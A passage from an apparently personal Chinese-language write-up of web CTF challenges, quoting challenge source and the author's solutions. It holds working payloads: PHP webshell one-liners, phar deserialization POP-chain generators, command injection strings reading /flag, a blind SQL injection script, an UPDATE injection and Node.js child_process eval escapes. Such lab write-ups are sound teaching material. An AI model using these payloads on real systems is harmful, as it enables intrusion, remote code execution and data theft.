$this-&gt;name=strtolower($this-&gt;name); } } class ff{ private $content; public $func; public function __construct(){ $this-&gt;content=\"\\&lt;?php @eval(\\$_POST[1]);?&gt;\"; } public function __get($key){ $this-&gt;$key-&gt;{$this-&gt;func}($_POST['cmd']); //cmd=ls等等 } } class zz{ public $filename; public $content='surprise'; public function __construct($filename){ $this-&gt;filename=$filename; } public function filter(){ if(preg_match('/^\\/|php:|data|zip|\\.\\.\\//i',$this-&gt;filename)){ die('这不合理'); } } public function write($var){ $filename=$this-&gt;filename; $lt=$this-&gt;filename-&gt;$var; //此功能废弃，不想写了 } public function getFile(){ $this-&gt;filter(); $contents=file_get_contents($this-&gt;filename); if(!empty($contents)){ return $contents; }else{ die(\"404 not found\"); } } public function __toString(){ $this-&gt;{$_POST['method']}($_POST['var']); //method=write;var=content return $this-&gt;content; } } class xx{ public $name; public $arg; public function __construct(){ $this-&gt;name='eval'; $this-&gt;arg='phpinfo();'; } public function __call($name,$arg){ $name($arg[0]); } } 其中read.php代码 可以看到这里调用了getfile函数，我们跟踪一下会发现，该函数存在file_get_contents方法，再结合文件上传，不难想到phar反序列化了，接下来就先构造链子，在构造phar文件 不过这里先说一个误区，当时我看到文件里面有众多需要post传参的参数，我就蒙了，我想着怎么在构造链子的时候进行post传参啊，结果就不会了，看了wp发现。如果我们上传了phar文件，当访问的时候，他会进行反序列化，此时我们可以在读取页面进行post传参即可。 直接看链子aa类-》aa类.name-》zz类.tostring-》zz类.write-》ff类.get-》xx类.call &lt;?php class aa{ public $name; } class ff{ private $content; public $func = 'system'; public function __construct(){ $this-&gt;content=new xx(); //注意content的赋值 } } class zz{ public $filename; public $content; } class xx{ public $name; public $arg; } $phar = new Phar(\"exp.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); //设置stub $pop = new aa(); $pop-&gt;name = new zz(); $pop-&gt;name-&gt;filename = new ff(); $phar-&gt;setMetadata($pop); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 最终上传文件后，用phar读取文件即可 [SWPUCTF 2023 秋季新生赛]RCE-PLUS &lt;?php error_reporting(0); highlight_file(__FILE__); function strCheck($cmd) { if(!preg_match(\"/\\;|\\&amp;|\\\\$|\\x09|\\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i\", $cmd)){ return($cmd); } else{ die(\"i hate this\"); } } $cmd=$_GET['cmd']; strCheck($cmd); shell_exec($cmd); ?&gt; 无回显RCE，幸运地是没禁用tee，直接配合ls将内容重定向到文件即可：cmd=cat /f*| tee 1.txt [SWPUCTF 2023 秋季新生赛]Pingpingping &lt;?php highlight_file(__FILE__); error_reporting(0); $_ping = $_GET['Ping_ip.exe']; if(isset($_ping)){ system(\"ping -c 3 \".$_ping); }else{ $data = base64_encode(file_get_contents(\"error.png\")); echo \"&lt;img src='data:image/png;base64,$data'/&gt;\"; } 简单的命令执行，不过注意参数的传参即可：?Ping[ip.exe=1 | cat /flag [NSSCTF 2022 Spring Recruit]babysql hacker!!black_list is /if|and|\\s|#|--/i 过滤了空格和注释符，那/**/代替空格，单引号闭合后面的单引号即可 username=-1'/**/union/**/select/**/(select/**/group_concat(flag)/**/from/**/flag)' 由于输入上述payload，页面回显有flag字样。因此也可以盲注进行 import string import requests import time strings = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\\",#$&amp;'()*+-./:;&lt;=&gt;?@[\\]^_`{|}~\" pwd = '' while True: flag = True for i in strings: data = {\"username\": f\"tarnisha'/**/or/**/database()/**/like/**/'{pwd+i}%\"} response = requests.post(\"http://node2.anna.nssctf.cn:28793/\", data=data) time.sleep(0.1) if \"flag\" in response.text: pwd += i print(pwd) flag = False break if flag: break [GFCTF 2021]Baby_Web 这里也是遗忘这个知识点了，不知道如何进行目录穿越： 利用漏洞为：CVE-2021-41773\\CVE-2021-42013，具体可参考：CVE-2021-41773 漏洞复现 这里我的dirsearch也扫出来过这个漏洞，但我直接在URL上发送就不可，必须用bp（不理解） 这里提醒着我，在扫目录的时候出现了cgi-bin就应该联想到目录穿越 验证成功，接下来就是读取源码了，他提示源码在上层目录的xxx.php.txt，猜测xxx为index &lt;h1&gt;Welcome To GFCTF 12th!!&lt;/h1&gt; &lt;?php error_reporting(0); define(\"main\",\"main\"); include \"Class.php\"; $temp = new Temp($_POST); $temp-&gt;display($_GET['filename']); ?&gt; &lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt; 读取Class.php，刚开始只输入Class.php竟然读取不到，联想之前，我尝试添加txt成功了 &lt;?php defined('main') or die(\"no!!\"); Class Temp{ private $date=['version'=&gt;'1.0','img'=&gt;'https://www.apache.org/img/asf-estd-1999-logo.jpg']; private $template; public function __construct($data){ $this-&gt;date = array_merge($this-&gt;date,$data); } public function getTempName($template,$dir){ if($dir === 'admin'){ $this-&gt;template = str_replace('..','','./template/admin/'.$template); if(!is_file($this-&gt;template)){ die(\"no!!\"); } } else{ $this-&gt;template = './template/index.html'; } } public function display($template,$space=''){ extract($this-&gt;date);//将键值当做变量，值当做变量的值 $this-&gt;getTempName($template,$space); include($this-&gt;template); } public function listdata($_params){ $system = [ 'db' =&gt; '', 'app' =&gt; '', 'num' =&gt; '', 'sum' =&gt; '', 'form' =&gt; '', 'page' =&gt; '', 'site' =&gt; '', 'flag' =&gt; '', 'not_flag' =&gt; '', 'show_flag' =&gt; '', 'more' =&gt; '', 'catid' =&gt; '', 'field' =&gt; '', 'order' =&gt; '', 'space' =&gt; '', 'table' =&gt; '', 'table_site' =&gt; '', 'total' =&gt; '', 'join' =&gt; '', 'on' =&gt; '', 'action' =&gt; '', 'return' =&gt; '', 'sbpage' =&gt; '', 'module' =&gt; '', 'urlrule' =&gt; '', 'pagesize' =&gt; '', 'pagefile' =&gt; '', ]; $param = $where = []; $_params = trim($_params); //主要去除字符串收尾空格符 $params = explode(' ', $_params); //按照空格将字符串分割为数组 if (in_array($params[0], ['list','function'])) { //看数组是否存在后面数组的指定值 $params[0] = 'action='.$params[0]; } foreach ($params as $t) { $var = substr($t, 0, strpos($t, '='));//找寻=符号第一次出现的位置：0-》位置 $val = substr($t, strpos($t, '=') + 1);//位置+1以后得（不包括位置+1） if (!$var) {//action=action=function //var=action，val=function continue; } if (isset($system[$var])) { $system[$var] = $val;//action=》function； } else { $param[$var] = $val; //action=》function } } // action switch ($system['action']) { case 'function': if (!isset($param['name'])) { //name键值的值必须存在且为已经定义的函数 return 'hacker!!'; } elseif (!function_exists($param['name'])) { return 'hacker!!'; } $force = $param['force']; if (!$force) { $p = []; foreach ($param as $var =&gt; $t) { if (strpos($var, 'param') === 0) {//返回param在var中首次出现的位置 $n = intval(substr($var, 5)); $p[$n] = $t; } } if ($p) { $rt = call_user_func_array($param['name'], $p); } else { $rt = call_user_func($param['name']); } return $rt; }else{ return null; } case 'list': return json_encode($this-&gt;date); } return null; } } 另外还有/template/admin/下的部分源码： &lt;!--&lt;img src=\"&lt;?php echo $img;?&gt;\"&gt;--&gt; &lt;div&gt;&lt;?php echo $this-&gt;listdata(\"action=list module=$mod\");?&gt;&lt;div&gt;//module=action=function &lt;h6&gt;version: &lt;?php echo $version;?&gt;&lt;/h6&gt; action=list、module=$mod 这道题代码审计审的我很累（因为太菜），最后还是陷入了一个小误区，还是无奈看了wp： [GFCTF 2021]Baby_Web(CVE-2021-41773) 从一道题入门PHP代码审计–很详细 这里我审计的时候，思路都理顺了，就是最终传payload陷入误区了。 总的来说，就是需要在filename传值中，要使其合理化，使得/template/admin/filename为一个合法文件 当然这里尝试几次就知道index.html即可 随后我们就能将上述$this-&gt;listdata(\"action=list module=$mod\")所在文件包含进去，而包含进去的目的就是为了调用最终的call_user_func_array或call_user_func函数，最终RCE 而其中我在传参数的时候，我以为param数组中的action=function的action是个键值，所以弄得我始终没成功，看了wp思考了一会儿发现应该会有数字索引的，也就是比如：0=》“action=function”这样理解的话，那system['action']=function就成立了。具体不再详述，上述文章很详细。 这里需要注意最终的命令执行函数还被禁了很多，但是无回显函数exec没禁用，那直接将输出重定向读取即可，当然还需要注意这里的空格（用合理字符代替） space=admin&amp;mod=hybcx action=function name=exec param0a=cat${IFS}/f11111111aaaagggg&gt;/var/www/html/1.txt 这里看了wp还有方法二，当时分析也没想着利用call_user_func函数，因为那里只有一个参数，我没深度思考是否能利用，但这里看了wp发现，直接传入phpinfo函数（这个函数不需要参数）而flag也恰好在其中 space=admin&amp;mod=hybcx action=function name=phpinfo [SWPUCTF 2023 秋季新生赛]一键连接! &lt;?php highlight_file(__FILE__); error_reporting(0); $md5_1 = $_GET['md5_1']; $md5_2 = $_GET['md5_2']; $sha1_1 = $_GET['sha1_1']; $sha1_2 = $_GET['sha1_2']; $new_player =$_GET['new_player']; if ($md5_1 !== $md5_2 &amp;&amp; md5($md5_1) === md5($md5_2)) { if ($sha1_1 != $sha1_2 &amp;&amp; sha1($sha1_1) === sha1($sha1_2)) { if (file_get_contents($new_player) === \"Welcome to NSSCTF!!!\") { echo \"Congratulations~~~~~~~~~\"; echo \"试试need Antsword&lt;br/&gt;\"; @eval($_POST['Nss']); }else{ echo \"可曾听过data协议?\"; } } else { echo \"sha1又如何相等呢\"; } } else { echo \"如何让md5值相等呢¿\"; } 如何让md5值相等呢¿ 思路很简单，数组绕过，伪协议绕过file_get_contents，最后webshell [SWPUCTF 2022 新生赛]file_master 这题某个知识点也是第一次见 来到首页，这里我对查看文件功能没做尝试，后面看wp发现这个可以用来查看源码进一步分析，直接抓包输入index.php即可，这里我直接放上源码 &lt;?php session_start(); if(isset($_GET['filename'])){ echo file_get_contents($_GET['filename']); } else if(isset($_FILES['file']['name'])){ $whtie_list = array(\"image/jpeg\"); $filetype = $_FILES[\"file\"][\"type\"]; if(in_array($filetype,$whtie_list)){ $img_info = @getimagesize($_FILES[\"file\"][\"tmp_name\"]); if($img_info){ if($img_info[0]&lt;=20 &amp;&amp; $img_info[1]&lt;=20){ if(!is_dir(\"upload/\".session_id())){ mkdir(\"upload/\".session_id()); } $save_path = \"upload/\".session_id().\"/\".$_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$save_path); $content = file_get_contents($save_path); if(preg_match(\"/php/i\",$content)){ sleep(5); @unlink($save_path); die(\"hacker!!!\"); }else{ echo \"upload success!! upload/your_sessionid/your_filename\"; } }else{ die(\"image hight and width must less than 20\"); } }else{ die(\"invalid file head\"); } }else{ die(\"invalid file type!image/jpeg only!!\"); } }else{ echo '&lt;img src=\"data:jpg;base64,'.base64_encode(file_get_contents(\"welcome.jpg\")).'\"&gt;'; } ?&gt; 这里不分析了，我黑盒做，当时上传，首先没限制后缀，然后是mime类型只能为jpeg，后面修改完之后，说文件头无效，这里用了几个似乎只有GIF89a才行。 随后又出来说图片的高度与宽度必须小于20，这里就蒙了，不知道如何限制，网上找了半天，还以为用工具来修改，看了wp发现代码即可。。。 如下图，直接宏定义完美解决 这里由于还会检测文件内容是否含有php字符，因此需要短标签绕过，这里借用人家的总结了 php短标签绕过 php中最常见的标签为 不过在题目上传时可能会被waf过滤掉php关键字。根据查询结果，还有四种php的标签，分别是： ① 仅在配置short_open_tag=on时可以使用，适合执行php语句； ②即使配置short_open_tag=off时依然可以使用，相当于，适合输出php语句~ 上述二者的短标签都不必闭合（即?&gt;可以省略不写，也可以连接成功 &lt;? @eval($_POST['a']);?&gt; &lt;?= @eval($_POST['a']);?&gt; &lt;? @eval($_POST['a']); &lt;?= @eval($_POST['a']); 但这里不知为何，似乎必须用有=符号的（因为配置问题）。上传之后，常规找flag即可 [SWPUCTF 2023 秋季新生赛]NSS_HTTP_CHEKER 老生常谈的http协议知识：不赘述了 [SWPU 2018]SimplePHP base.php &lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;web3&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\"&gt; &lt;script src=\"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=\"navbar navbar-default\" role=\"navigation\"&gt; &lt;div class=\"container-fluid\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;a class=\"navbar-brand\" href=\"index.php\"&gt;首页&lt;/a&gt; &lt;/div&gt; &lt;ul class=\"nav navbar-nav navbra-toggle\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"file.php?file=\"&gt;查看文件&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"upload_file.php\"&gt;上传文件&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=\"nav navbar-nav navbar-right\"&gt; &lt;li&gt;&lt;a href=\"index.php\"&gt;&lt;span class=\"glyphicon glyphicon-user\"&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt; upload_file.php &lt;?php include 'function.php'; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=\"utf-8\"&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = \"center\"&gt; &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt; p{ margin:0 auto} &lt;/style&gt; &lt;div&gt; &lt;form action=\"upload_file.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;文件名:&lt;/label&gt; &lt;input type=\"file\" name=\"file\" id=\"file\"&gt;&lt;br&gt; &lt;input type=\"submit\" name=\"submit\" value=\"提交\"&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 继续查看function.php &lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\";//随机命名文件名 //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) { //应该是防止文件名重复，导致覆盖 unlink($filename); } move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); //没毛病就上传 echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); //按照.符号将文件名分割开成数组 $extension = end($temp); //数组的指针指向数组的最后一个单元，这里就是后缀名 if(empty($extension)) { //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; } else{ if(in_array($extension,$allowed_types)) { //白名单过滤 return true; } else { echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; } } } ?&gt; 最后看一下查看文件：file.php &lt;?php header(\"content-type:text/html;charset=utf-8\"); include 'function.php'; include 'class.php'; ini_set('open_basedir','/var/www/html/'); //限制了目录 $file = $_GET[\"file\"] ? $_GET['file'] : \"\"; //查看指定文件 if(empty($file)) { echo \"&lt;h2&gt;There is no file to show!&lt;h2/&gt;\"; } $show = new Show(); if(file_exists($file)) { //如果文件存在，则调用show函数展示 $show-&gt;source = $file; $show-&gt;_show(); } else if (!empty($file)){ die('file doesn\\'t exists.'); } ?&gt; 再看一下class.php &lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = \"index.php\"; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?&gt; 分析了一波上述文件代码，重点联动的就是上传文件和查看文件了，一般有这俩功能的站点，大概率就会有phar反序列化吧。 查看文件里面没啥说的，主要就是调用class.php里面的类方法。第一个注意的就是function.php里面对于上传的文件的处理：在这里首先限制了文件名后缀（且仅有这种限制），只修要修改后缀即可，没啥说的。 后面对于文件的处理，则是先取出完整的文件名称，例如exp.php经过$_FILES[\"file\"][\"name\"]处理后依然是exp.php之后，拼接我们的ip地址，也就是在页面右上角处（如下图所示） 之后经过md5的加密组成文件名+jpg的方式，最后就是md5(拼接字符串).jpg，这也是我们最后访问的文件名。 接下来就是针对class的反序列化链子的分析了：这里不难分析，主要先定位到引起phar反序列化的点file_get_contents函数，这也就是最后读取flag的函数。 进一步分析不难发现这个链子：C1e4r.__destruct-》Show.__toString-》Test.__get-》Test.get-》Test.file_get，最后pop如下 &lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $phar = new Phar(\"exp.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); //设置stub $pop = new C1e4r(); $pop-&gt;str = new Show(); $pop-&gt;str-&gt;str = array(\"str\"=&gt;new Test()); $pop-&gt;str-&gt;str['str']-&gt;params = array(\"source\"=&gt;'/var/www/html/f1ag.php'); $phar-&gt;setMetadata($pop); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 这里我也陷入了一个误区就是对于调用_get魔术方法的理解。我以为$this-&gt;str['str']-&gt;source这一步的调用，是将source的参数值赋值给了get魔术方法的参数key，没想到看了PHP手册发现是直接将source参数名称复制给了key，这才有了后续的array(\"source\"=&gt;'/var/www/html/f1ag.php')的产生。 最后生成的phar文件，修改后缀即可，最后file参数访问即可得到flag [SWPUCTF 2023 秋季新生赛]UnS3rialize &lt;?php highlight_file(__FILE__); error_reporting(0); class NSS { public $cmd; function __invoke() { echo \"Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;\"; system($this-&gt;cmd); } function __wakeup() { echo \"W4keup!!!&lt;br/&gt;\"; $this-&gt;cmd = \"echo Welcome to NSSCTF\"; } } class C { public $whoami; function __get($argv) { echo \"what do you want?\"; $want = $this-&gt;whoami; return $want(); } } class T { public $sth; function __toString() { echo \"Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger\"; return $this-&gt;sth-&gt;var; } } class F { public $user = \"nss\"; public $passwd = \"ctf\"; public $notes; function __construct($user, $passwd) { $this-&gt;user = $user; $this-&gt;passwd = $passwd; } function __destruct() { if ($this-&gt;user === \"SWPU\" &amp;&amp; $this-&gt;passwd === \"NSS\") { echo \"Now you know how to use __construct&lt;br/&gt;\"; echo \"your notes\".$this-&gt;notes; }else{ die(\"N0!\"); } } } if (isset($_GET['ser'])) { $ser = unserialize(base64_decode($_GET['ser'])); } else { echo \"Let's do some deserialization :)\"; } Let's do some deserialization :) 这道题，链子简单，就是绕过wakeup就行了，也是老办法，链子如下 &lt;?php class NSS { public $cmd; } class C { public $whoami; } class T { public $sth; } class F { public $user = \"SWPU\"; public $passwd = \"NSS\"; public $notes; } $pop = new F(); $pop-&gt;notes = new T(); $pop-&gt;notes-&gt;sth = new C(); $pop-&gt;notes-&gt;sth-&gt;whoami = new NSS(); $pop-&gt;notes-&gt;sth-&gt;whoami-&gt;cmd = \"cat /flag\"; echo serialize($pop).\" \"; $pop1 = str_replace('\"F\":3','\"F\":4',serialize($pop)); echo base64_encode($pop1); ?&gt; 修改属性数量即可 [SWPUCTF 2023 秋季新生赛]ez_talk 这里首先直接上传了php文件，结果在修改mime，后缀，文件头，都不行。且给的提示始终如一，所以我上传了正常的文件，之后发现根本不检测后缀。 于是尝试在正常图片加载php一句话木马，但依旧被ban，原因如下图使用了getimagesize函数来检测文件内容。 因此直接上传图片马，然后bp抓包修改后缀，访问对应文件；如下图，仔细观察就知道，上传目录他反转了而已，正常访问即可 [SWPUCTF 2023 秋季新生赛]NSS大卖场 这也是第一次遇见update注入，脑子里根本没有这种想法，也是看了wp才自我认为想通了 首先是对页面常规测试了一番，也没什么信息，除了一个明显的hint，flag买不起。 虽然看了题目标签写着update注入，但是我虽然找到了注入点，但不知道如何下手，算是增长经验了。 首先看hint，给了一个数据库备份文件 这里当时分析的时候，也没有分析出什么，看了wp才知道自己是没有分析的思路（就是不会分析）。 现在回过头来可以看到，这里面含有items表，而其中含有各种列名，但值得注意的就是price价格表，这也似乎成了后面为何想到update注入的关键了。 这里会想到通过update来更改items的price为1，这样就买的起了，接下来就是找注入点了，可以想到买商品的地方很可能存在注入点。这里尝试了一番，直接在url后面加了个单引号，于是爆出sql错误，接着进行恶意语句的写入，发现过滤了如下关键字 SELECT|select|UPDATE|update|WHERE|where| |or|AND|and|ORDER|order|BY|by|--|&lt;|&gt;|! 但很明显可以大小写绕过，payload如下，这里不知道为何内联注释符不能代替空格 buy/1';Update%09items%09set%09price=1;#//设置items的price字段全为1 更新某一列 UPDATE table SET column=new_value WHERE column= value 更新若干列 UPDATE table SET column1=new_value1, column2=new_value2 WHEREcolumn= value 之后直接买flag，查看即可 [GFCTF 2021]ez_calc 首先是一个登录框，这里看F12得到提示，采用nodejs处理，如果我们输入的用户名转换成小写不等于admin且转换为大写等于ADMIN且用户名等于admin123即可登录，这里翻了翻笔记，发现这样的特性 toUpperCase()是javascript中将小写转换成大写的函数。 toLowerCase()是javascript中将大写转换成小写的函数 除此之外 在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。 在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。 很显然，这里采用特殊字符即可。登陆之后发现是个计算器 &lt;!-- let calc = req.body.calc; let flag = false; //waf for (let i = 0; i &lt; calc.length; i++) { if (flag || \"/(flc'\\\".\".split``.some(v =&gt; v == calc[i])) { //禁用(,'f','l','c',\"'\",'\"','.' 这些字符 flag = true; calc = calc.slice(0, i) + \"*\" + calc.slice(i + 1, calc.length); } } //截取 calc = calc.substring(0, 64); //去空 calc = calc.replace(/\\s+/g, \"\"); calc = calc.replace(/\\\\/g, \"\\\\\\\\\");//将反斜杠替换为两个反斜杠 //小明的同学过滤了一些比较危险的东西 while (calc.indexOf(\"sh\") &gt; -1) { calc = calc.replace(\"sh\", \"\"); } while (calc.indexOf(\"ln\") &gt; -1) { calc = calc.replace(\"ln\", \"\"); } while (calc.indexOf(\"fs\") &gt; -1) { calc = calc.replace(\"fs\", \"\"); } while (calc.indexOf(\"x\") &gt; -1) { calc = calc.replace(\"x\", \"\"); } try { result = eval(calc); } --&gt; 这里主要就是绕过第一个if条件语句的限制，首先他会检查传入的calc字符串的每一位字符是否为黑名单中的字符，如果是的话则过滤掉。这里限制的很死，我也是第一次遇见，只能看wp了，发现利用的是数组绕过。 原理是，如果我们传入如下内容：[\"aaaaa\",\"bbbbb\",ccccc]，那么该长度就是3了，而不是字符串的长度了。 这里似乎他在检查的时候，就只会把第一个元素当做整体了，即使其中包含黑名单字符，也不会进行过滤了，也就是这样的：[\"a)aaa\",\"bbbbb\",\"(\",]在经过过滤之后会变成a)a********，因为他是在第三个为发现了敏感字符。于是按照逻辑，会将第三位以后得内容都进行替换。这样我们第一个元素的敏感字符就逃逸了。 详细解释可以参考：一道Node.js类型混淆污染与字符逃逸实现SQL注入的题目分析 至于为什么一定要在最后搞一个敏感字符，那是因为如果都是正常的话，程序就会报错，但如果含有敏感字符，那前面的payload就可以执行 这样的话，可以按照逻辑进行如下构造：我们想要构造payload有多长，后面的数组就需要多少 calc[]=require(\"child_process\").spawnSync('ls',['/']).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=. 这里不加stdout.toString()就没回显 接下来就是读取了，因为flag的名字很长，会超过长度限制，因此这里又需要对代码的理解了（GFCTF_is_girlfriend_ctf.flag） 这里过滤了x，也无法直接利用exec，但是实际上这里是可以绕过的，因为我们通过require导入的模块是一个Object，那么就可以通过Object.values获取到child_process里面的各种方法，那么再通过数组下标[5]就可以得到execSync了，那么有了execSync后就可以通过写入文件的方式读取flag了，payload如下: calc[]=Object.values(require('child_process'))[5]('cat${IFS}/G*&gt;p')&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=. 执行之后直接读取p试试。 calc[]=require('child_process').spawnSync('nl',['p']).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=. 参考文章 WP篇之解析2021 GFCTF中的两道Web [SWPUCTF 2022 新生赛]Power! 看到hint说给source传参，猜测是查看文件。 index.php &lt;?php class FileViewer{ public $black_list = \"flag\"; public $local = \"http://127.0.0.1/\"; public $path; public function __call($f,$a){ $this-&gt;loadfile(); } public function loadfile(){ if(!is_array($this-&gt;path)){ if(preg_match(\"/\".$this-&gt;black_list.\"/i\",$this-&gt;path)){ $file = 